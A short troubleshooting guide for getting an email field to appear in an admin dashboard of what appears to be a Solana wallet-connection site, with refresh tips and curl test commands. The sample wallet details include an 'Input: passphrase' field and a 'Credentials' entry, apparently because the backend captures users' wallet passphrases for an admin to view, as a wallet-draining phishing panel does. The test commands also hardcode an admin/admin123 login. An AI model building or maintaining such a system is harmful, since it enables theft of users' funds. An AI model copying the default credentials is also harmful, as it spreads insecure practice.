# How to See Email in Admin Dashboard

## The Issue
Browser is caching the old version of admin.html without the email field.

## The Solution - Hard Refresh

### Windows/Linux (Chrome/Edge/Firefox)
Press: **Ctrl + Shift + R** or **Ctrl + F5**

### Mac (Chrome/Safari)
Press: **Cmd + Shift + R**

### Alternative: Clear Cache
1. Open DevTools (F12)
2. Right-click on the refresh button
3. Select "Empty Cache and Hard Reload"

## What You Should See After Refresh

### 1. Main Table View
```
| Wallet Address | Email              | Type    | SOL  | Aetherbot | Logins | Actions |
|----------------|--------------------|---------| -----|-----------|--------|---------|
| Gx7x...xxx     | user@example.com   | solflare| 0.00 | 100.00    | 5      | View... |
| 8Kzp...yyy     | Not provided       | phantom | 0.00 | 0.00      | 1      | View... |
```

### 2. Click "View" Button → Details Modal
```
📊 Wallet Details

Address: Gx7x...xxx
Email: user@example.com      ← THIS LINE SHOULD NOW APPEAR
Type: solflare
Input: passphrase
SOL: 0.0000
Aetherbot: 100.00
Total SOL Credited: 0.0000
Total Aetherbot Credited: 100.00
Logins: 5
Created: 10/21/2025, 10:30:00 AM

Credentials: [if available]
```

## If Still Not Showing

1. **Check Browser Console** (F12 → Console tab)
   - Look for any JavaScript errors
   - Check if the API response includes email field

2. **Verify API Response**
   - Open DevTools Network tab
   - Refresh the page
   - Find the `get-all-wallets` request
   - Check the response - each wallet should have an `email` field

3. **Test with a New Wallet**
   - Connect a wallet with an email parameter
   - The email should appear immediately in the admin dashboard

## Quick Test Command

Test if backend is returning email:
```powershell
# Get admin token first (save the token from response)
curl -X POST http://localhost:8888/.netlify/functions/admin-login `
  -H "Content-Type: application/json" `
  -d '{"username":"admin","password":"admin123"}'

# Then get all wallets (replace YOUR_TOKEN)
curl -X GET http://localhost:8888/.netlify/functions/get-all-wallets `
  -H "Authorization: Bearer YOUR_TOKEN"
```

Look for `"email":` in each wallet object in the response.
